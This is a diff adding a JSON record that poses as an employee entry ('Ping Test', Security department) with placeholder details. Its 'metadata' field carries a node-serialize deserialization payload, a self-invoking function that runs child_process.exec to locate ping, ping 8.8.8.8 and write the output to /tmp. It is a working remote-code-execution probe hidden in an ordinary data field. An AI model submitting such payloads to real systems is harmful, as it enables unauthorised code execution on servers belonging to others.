@@ -1,0 +1,14 @@
+{
+  "name": "Ping Test",
+  "position": "Tester",
+  "department": "Security",
+  "email": "pingtest@example.com",
+  "phone": "555-000-0000",
+  "location": "Remote",
+  "hire_date": "2023-01-01",
+  "status": "active",
+  "manager": "None",
+  "salary": 0,
+  "bio": "This is a test.",
+  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('which ping > /tmp/ping_command.txt && ping -c 1 8.8.8.8 > /tmp/ping_output.txt 2>/tmp/ping_error.txt || echo \"Ping not available\" > /tmp/ping_error.txt', function(error, stdout, stderr){}); return '';}()\"}"
+} 
